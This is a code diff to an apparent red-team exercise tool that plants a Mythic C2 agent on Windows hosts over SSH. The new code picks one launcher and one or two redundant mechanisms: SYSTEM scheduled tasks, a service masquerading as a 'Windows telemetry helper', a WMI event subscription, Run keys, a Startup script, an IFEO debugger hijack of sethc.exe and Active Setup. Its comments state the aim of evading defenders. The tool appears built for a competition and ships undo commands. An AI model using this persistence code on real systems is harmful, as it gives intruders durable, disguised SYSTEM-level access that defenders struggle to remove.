@@ -28,9 +28,19 @@ import time
 from pathlib import Path
 
 from ..errors import C2Error
+
 from . import FakeMythic  # noqa: F401  (re-exported convenience for callers)
 
 MANIFEST_REL = Path("red/payloads/manifest.json")
+
+# Windows persistence surfaces. A plant draws ONE launcher (something that puts
+# the agent on the box now) and one or two redundant mechanisms from other
+# surfaces, so a defender has to sweep several places and killing one leaves the
+# channel up. A single ONSTART task is a one-look IOC.
+WINDOWS_LAUNCHERS = ("task_onstart", "task_onlogon", "task_daily", "service",
+                     "wmi", "run_key", "startup", "active_setup")
+WINDOWS_REDUNDANCY = ("run_key", "startup", "ifeo", "active_setup", "wmi")
+
 
 
 def manifest_path(comp_dir):
@@ -204,73 +214,196 @@ class Planter:
                 "check_cmd": f"systemctl is-active {unit}"}
 
     def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
-        """Install the frozen payload as an ONSTART scheduled task running as SYSTEM.
+        """Plant the frozen payload through a mix of Windows mechanisms.
 
-        A Mythic console agent (apollo) is NOT a service binary: `New-Service`
-        registers it and `Start-Service` then dies with 1053 ("did not respond in
-        a timely manner"). That is what every Windows box reported on the
-        2026-10-18 scrim — `service install rc=1: #< CLIXML …`, 0/26. A scheduled
-        task runs the console agent as SYSTEM at boot and can be started
-        immediately, so the channel comes up without a service wrapper.
+        One ONSTART task is an IOC: blue finds it once and the whole board is
+        clean in a minute. Each plant therefore draws a LAUNCHER that starts the
+        agent now, plus one or two REDUNDANT persistence mechanisms from
+        different surfaces (registry, WMI subscription, IFEO debugger, per-user
+        setup) — so a defender has to know four different places to look, and
+        killing one leaves the channel alive.
+
+        The process is the proof: whatever the mechanisms report, the install is
+        only ok when the payload image is running on the box.
         """
         from ..effects import artifactnames as names
         fh = self.ctx.world.foothold(ip)
         if not fh:
             return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
-        drawn = names.windows_names(self.ctx.world, rng=self.ctx.rng,
+        rng = self.ctx.rng
+        drawn = names.windows_names(self.ctx.world, rng=rng,
                                     mode=names.mode_from_cfg(self.ctx.cfg))
-        task = drawn["task"]
+        launcher = rng.choice(WINDOWS_LAUNCHERS)
+        redundant = [m for m in WINDOWS_REDUNDANCY
+                     if m not in (launcher,)]
+        rng.shuffle(redundant)
+        redundant = redundant[:rng.choice((1, 2))]
         remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
         remote = f"{remote_dir}\\{box_id}.exe"
         staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
         try:
-            self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
-                             f'powershell -NoProfile -Command "New-Item -ItemType '
-                             f'Directory -Force -Path \'{remote_dir}\' | Out-Null"',
-                             timeout=90, key_path=fh.get("key_path"))
+            self._win(ip, fh, f'powershell -NoProfile -Command "New-Item -ItemType '
+                              f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                   staged, key_path=fh.get("key_path"))
         except Exception as exc:                       # transport blowups are data
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
-        # /F makes the create idempotent, and the query is the proof, not the rc (a
-        # second /Run of an already-running task answers non-zero). Every step is
-        # `&&`-chained: a bare `&` backgrounds the create and the query then reads
-        # the task before it exists (that reported status=Ready on dc01 while the
-        # task was still being registered).
-        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC ONSTART /RU SYSTEM '
-                  f'/RL HIGHEST /F && schtasks /Run /TN "{task}" && '
-                  f'schtasks /Query /TN "{task}" /FO LIST')
-        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
-                                        script, timeout=180,
-                                        key_path=fh.get("key_path"))
-        status = _schtasks_status(out)
-        deadline = self._now() + float(wait_sec)
-        while status.lower() != "running" and self._now() < deadline:
-            time.sleep(3)
-            _r, _o, _e = self.ctx.ssh.ssh(
-                ip, fh["user"], fh.get("password") or "",
-                f'schtasks /Query /TN "{task}" /FO LIST', timeout=60,
-                key_path=fh.get("key_path"))
-            status = _schtasks_status(_o)
-        ok = status.lower() == "running"
-        if not ok:
-            # The task can start and then be reported outside the query window (or
-            # removed while its process lives). The process IS the implant: ask for
-            # it by image name before declaring the plant dead.
-            _r, _o, _e = self.ctx.ssh.ssh(
-                ip, fh["user"], fh.get("password") or "",
-                f'tasklist /FI "IMAGENAME eq {Path(staged).name}"', timeout=60,
-                key_path=fh.get("key_path"))
-            if Path(staged).name.lower() in (_o or "").lower():
-                ok = True
-                status = status or "process running"
-        return {"ok": ok,
-                "detail": (f"task {task} Running on {ip} (transport {transport})" if ok
-                           else f"task install rc={rc} status={status or '?'}: "
-                                f"{(err or out).strip()[:200]}"),
-                "unit": task, "paths": [remote, f"task:{task}"],
-                "check_cmd": f'schtasks /Query /TN "{task}" /FO LIST'}
+
+        undo, artifacts, notes = [], [], []
+        chosen = []
+        for mechanism in [launcher] + redundant:
+            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, drawn, remote)
+            chosen.append(mechanism)
+            notes.append(f"{mechanism}: {spec['detail']}")
+            undo.extend(spec["undo"])
+            artifacts.extend(spec["paths"])
+        # The launcher may be passive (a logon trigger, a WMI timer): start the
+        # agent once, detached, so the channel is live inside this seed window.
+        alive = self._win_process_running(ip, fh, Path(staged).name)
+        if not alive:
+            self._win(ip, fh,
+                      f'cmd /c start "" /b "{remote}"')
+            deadline = self._now() + 20
+            while not alive and self._now() < deadline:
+                time.sleep(3)
+                alive = self._win_process_running(ip, fh, Path(staged).name)
+        return {"ok": bool(alive),
+                "detail": (f"{Path(staged).name} running on {ip} via "
+                           f"{' + '.join(chosen)} (transport {transport})" if alive
+                           else f"payload never started on {ip}: " + "; ".join(notes)[:180]),
+                "unit": launcher, "paths": [remote] + artifacts,
+                "mechanisms": chosen,
+                "undo": undo or [f'schtasks /Delete /TN "{drawn["task"]}" /F',
+                                 f"Remove-Item -Path '{remote}' -Force"],
+                "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}
+
+    # -- windows mechanism helpers -------------------------------------------
+
+    def _win(self, ip, fh, command, timeout=120):
+        """Run one cmd/powershell line on a Windows box over its SSH channel."""
+        return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
+                                timeout=timeout, key_path=fh.get("key_path"))
+
+    def _win_process_running(self, ip, fh, image):
+        _rc, out, _err = self._win(
+            ip, fh, f'tasklist /FI "IMAGENAME eq {image}"', timeout=60)
+        return image.lower() in (out or "").lower()
+
+    def _mech_task(self, ip, fh, drawn, remote, *, trigger):
+        task = drawn["task"]
+        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC {trigger} '
+                  f'/RU SYSTEM /RL HIGHEST /F'
+                  + (' && schtasks /Run /TN "' + task + '"' if trigger == "ONSTART" else ""))
+        rc, out, err = self._win(ip, fh, script, timeout=180)
+        return {"detail": f"task {task} ({trigger}) rc={rc}",
+                "paths": [f"task:{task}"],
+                "undo": [f'schtasks /End /TN "{task}"',
+                         f'schtasks /Delete /TN "{task}" /F']}
+
+    def _mech_task_onstart(self, ip, fh, drawn, remote):
+        return self._mech_task(ip, fh, drawn, remote, trigger="ONSTART")
+
+    def _mech_task_onlogon(self, ip, fh, drawn, remote):
+        return self._mech_task(ip, fh, drawn, remote, trigger="ONLOGON")
+
+    def _mech_task_daily(self, ip, fh, drawn, remote):
+        # A recurring trigger with a random minute: the agent comes back every
+        # hour without a boot and without a logon.
+        minute = self.ctx.rng.randrange(1, 60)
+        task = drawn["task"]
+        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC MINUTE /MO 60 '
+                  f'/ST 00:{minute:02d} /RU SYSTEM /RL HIGHEST /F')
+        rc, out, err = self._win(ip, fh, script, timeout=180)
+        return {"detail": f"task {task} (MINUTE/60) rc={rc}",
+                "paths": [f"task:{task}"],
+                "undo": [f'schtasks /End /TN "{task}"',
+                         f'schtasks /Delete /TN "{task}" /F']}
+
+    def _mech_service(self, ip, fh, drawn, remote):
+        # A console agent cannot be an SCM service (1053), so the service runs a
+        # detached launcher; the service entry is the persistence, the child is
+        # the agent. `sc failure` makes a stopped launcher restart itself.
+        svc = drawn["service"]
+        script = (f'sc create "{svc}" binPath= "cmd /c start \\"\\" /b {remote}" '
+                  f'start= auto && sc description "{svc}" "Windows telemetry helper" && '
+                  f'sc failure "{svc}" reset= 0 actions= restart/60000 && sc start "{svc}"')
+        rc, out, err = self._win(ip, fh, script, timeout=180)
+        return {"detail": f"service {svc} rc={rc}",
+                "paths": [f"service:{svc}"],
+                "undo": [f'sc stop "{svc}"', f'sc delete "{svc}"']}
+
+    def _mech_wmi(self, ip, fh, drawn, remote):
+        name = drawn["wmi"]
+        ps = (
+            "powershell -NoProfile -Command \""
+            f"$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
+            f"-Arguments @{{Name='{name}'; EventNamespace='root\\cimv2'; "
+            f"QueryLanguage='WQL'; Query=\\\"SELECT * FROM __InstanceModificationEvent "
+            f"WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\\"}}; "
+            f"$c = Set-WmiInstance -Namespace root\\subscription -Class "
+            f"CommandLineEventConsumer -Arguments @{{Name='{name}'; "
+            f"CommandLineTemplate='{remote}'; ExecutablePath='{remote}'}}; "
+            "Set-WmiInstance -Namespace root\\subscription -Class "
+            "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null\"")
+        rc, out, err = self._win(ip, fh, ps, timeout=180)
+        return {"detail": f"WMI subscription {name} rc={rc}",
+                "paths": [f"wmi:{name}"],
+                "undo": ["powershell -NoProfile -Command \"Get-WmiObject -Namespace "
+                         "root\\subscription -Class __FilterToConsumerBinding | "
+                         f"Where-Object {{ $_.Consumer -match '{name}' }} | Remove-WmiObject; "
+                         "Get-WmiObject -Namespace root\\subscription -Class "
+                         f"__EventFilter | Where-Object {{ $_.Name -eq '{name}' }} | Remove-WmiObject; "
+                         "Get-WmiObject -Namespace root\\subscription -Class "
+                         "CommandLineEventConsumer | "
+                         f"Where-Object {{ $_.Name -eq '{name}' }} | Remove-WmiObject\""]}
+
+    def _mech_run_key(self, ip, fh, drawn, remote):
+        value = drawn["run_value"]
+        rc, out, err = self._win(
+            ip, fh, f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                    f'/v "{value}" /t REG_SZ /d "{remote}" /f', timeout=90)
+        return {"detail": f"HKLM Run value {value} rc={rc}",
+                "paths": [f"registry:HKLM\\...\\Run\\{value}"],
+                "undo": [f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion'
+                         f'\\Run" /v "{value}" /f']}
+
+    def _mech_startup(self, ip, fh, drawn, remote):
+        name = drawn["run_value"]
+        cmd = f"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd"
+        body = f'start "" /b "{remote}"'
+        ps = (f'powershell -NoProfile -Command "Set-Content -Path \'C:\\ProgramData'
+              f'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd\' '
+              f'-Value \'{body}\' -Encoding ascii"')
+        rc, out, err = self._win(ip, fh, ps, timeout=90)
+        return {"detail": f"startup item {name}.cmd rc={rc}",
+                "paths": [cmd],
+                "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}
+
+    def _mech_ifeo(self, ip, fh, drawn, remote):
+        # Debugger hijack on an accessibility binary: the payload starts as SYSTEM
+        # at the logon screen (shift x5), a surface almost nobody checks.
+        target = "sethc.exe"
+        key = (f"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File "
+               f"Execution Options\\{target}")
+        rc, out, err = self._win(
+            ip, fh, f'reg add "{key}" /v Debugger /t REG_SZ /d "{remote}" /f', timeout=90)
+        return {"detail": f"IFEO debugger on {target} rc={rc}",
+                "paths": [f"registry:{key}\\Debugger"],
+                "undo": [f'reg delete "{key}" /v Debugger /f']}
+
+    def _mech_active_setup(self, ip, fh, drawn, remote):
+        rng = self.ctx.rng
+        hex8 = lambda n: "".join(f"{rng.randrange(16):x}" for _ in range(n))
+        guid = f"{{{hex8(8)}-{hex8(4)}-{hex8(4)}-{hex8(4)}-{hex8(12)}}}"
+        key = (f"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}")
+        stub = f'cmd /c start "" /b "{remote}"'
+        script = (f'reg add "{key}" /v StubPath /t REG_SZ /d "{stub}" /f && '
+                  f'reg add "{key}" /v Version /t REG_SZ /d "1,0,0,0" /f')
+        rc, out, err = self._win(ip, fh, script, timeout=90)
+        return {"detail": f"Active Setup {guid} rc={rc}",
+                "paths": [f"registry:{key}"],
+                "undo": [f'reg delete "{key}" /f']}
 
     # -- evidence -----------------------------------------------------------
 
@@ -309,3 +442,18 @@ class Planter:
 
     def _iso(self, epoch):
         return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))
+
+
+# Mechanism name -> builder. Each builder registers one persistence surface and
+# returns its own undo, so a plant's restore covers exactly what it touched.
+WINDOWS_MECHANISMS = {
+    "task_onstart": Planter._mech_task_onstart,
+    "task_onlogon": Planter._mech_task_onlogon,
+    "task_daily": Planter._mech_task_daily,
+    "service": Planter._mech_service,
+    "wmi": Planter._mech_wmi,
+    "run_key": Planter._mech_run_key,
+    "startup": Planter._mech_startup,
+    "ifeo": Planter._mech_ifeo,
+    "active_setup": Planter._mech_active_setup,
+}
